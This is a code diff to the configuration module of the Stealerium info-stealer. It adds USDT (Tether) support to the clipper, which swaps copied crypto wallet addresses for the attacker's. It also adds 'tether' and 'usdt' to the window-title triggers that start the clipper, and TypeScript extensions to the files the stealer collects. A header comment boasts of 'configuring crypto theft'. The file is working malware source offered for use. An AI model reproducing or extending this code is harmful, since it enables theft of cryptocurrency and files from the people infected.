@@ -1,3 +1,16 @@
+/*
+ * Stealerium Stub - Configuration Module
+ * 
+ * 🔥 Enhanced by @chocolaid on GitHub
+ * 
+ * Features Added:
+ * - USDT clipper address configuration
+ * - USDT crypto service triggers
+ * - Complete USDT integration for clipper functionality
+ * 
+ * "Configuring crypto theft like a fucking professional" 💀
+ */
+
 using System.Collections.Generic;
 using Stealerium.Modules.Implant;
 
@@ -90,7 +103,8 @@ namespace Stealerium
             {
                 {"btc", "--- ClipperBTC ---"}, // Bitcoin
                 {"eth", "--- ClipperETH ---"}, // Ethereum
-                {"ltc", "--- ClipperLTC ---"} // Litecoin
+                {"ltc", "--- ClipperLTC ---"}, // Litecoin
+                {"usdt", "--- ClipperUSDT ---"} // USDT (Tether)
             };
 
         // Start keylogger when active window title contains this text:
@@ -113,8 +127,8 @@ namespace Stealerium
         // Start clipper when active window title contains this text:
         public static string[] CryptoServices =
         {
-            "bitcoin", "monero", "dashcoin", "litecoin", "etherium", "stellarcoin",
-            "btc", "eth", "xmr", "xlm", "xrp", "ltc", "bch",
+            "bitcoin", "monero", "dashcoin", "litecoin", "etherium", "stellarcoin", "tether",
+            "btc", "eth", "xmr", "xlm", "xrp", "ltc", "bch", "usdt",
             "blockchain", "paxful", "investopedia", "buybitcoinworldwide",
             "cryptocurrency", "crypto", "trade", "trading", "wallet", "coinomi", "coinbase"
         };
@@ -145,7 +159,7 @@ namespace Stealerium
             ["SourceCode"] = new[]
             {
                 "c", "cs", "cpp", "asm", "sh", "py", "pyw", "html", "css", "php", "go", "js", "rb", "pl", "swift",
-                "java", "kt", "kts", "ino"
+                "java", "kt", "kts", "ino", "tsx", "ts"
             },
             ["Image"] = new[] {"jpg", "jpeg", "png", "bmp", "psd", "svg", "ai"}
         };
@@ -160,6 +174,7 @@ namespace Stealerium
             ClipperAddresses["btc"] = StringsCrypt.DecryptConfig(ClipperAddresses["btc"]);
             ClipperAddresses["eth"] = StringsCrypt.DecryptConfig(ClipperAddresses["eth"]);
             ClipperAddresses["ltc"] = StringsCrypt.DecryptConfig(ClipperAddresses["ltc"]);
+            ClipperAddresses["usdt"] = StringsCrypt.DecryptConfig(ClipperAddresses["usdt"]);
         }
     }
 }
